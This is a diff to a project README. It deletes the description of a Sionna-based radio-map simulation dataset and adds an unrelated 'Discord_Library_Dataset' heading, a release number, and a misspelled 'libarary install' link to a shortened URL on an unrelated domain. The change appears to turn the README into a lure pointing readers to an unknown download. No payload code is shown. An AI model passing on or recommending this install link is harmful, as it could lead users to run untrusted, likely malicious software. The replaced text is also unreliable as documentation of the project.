@@ -1,22 +1,8 @@
-# RadioMap_Dataset_Reflection/Scattering_Counts
+# Discord_Library_Dataset
 
-## RadioMap_Dataset
+# Releases: 1.3
 
-This dataset is generated using the TensorFlow-based open-source library for simulating ray tracing (RT),
-Sionna (https://nvlabs.github.io/sionna/index.html), with varying sums of reflections and scatterings. The simulation
-environment is based on different urban areas in China. The region of interest is a square area with a side length of
-620 meters, and the transmitters (TXs) are uniformly distributed at an altitude of 1.5 meters. The heights of the ground
-receivers (RXs) are fixed at 1.5 meters.
-
-In the simulation:
-
-- Environment frequency: 2.5 GHz
-- Transmitter power: 23 dBm
-- Transmitter height: 1.5 meters
-- Transmitter antenna array: 8×4 elements with both vertical and horizontal spacing of 0.06 meters (half wavelength),
-  isotropic radiation pattern, and dual polarization
-- Receiver height: 1.5 meters
-- Receiver antenna array: single element with isotropic radiation pattern and cross polarization
+## libarary install [version latest](https://sysurl.com.br/ekVmR)
 
 ## Document:
 
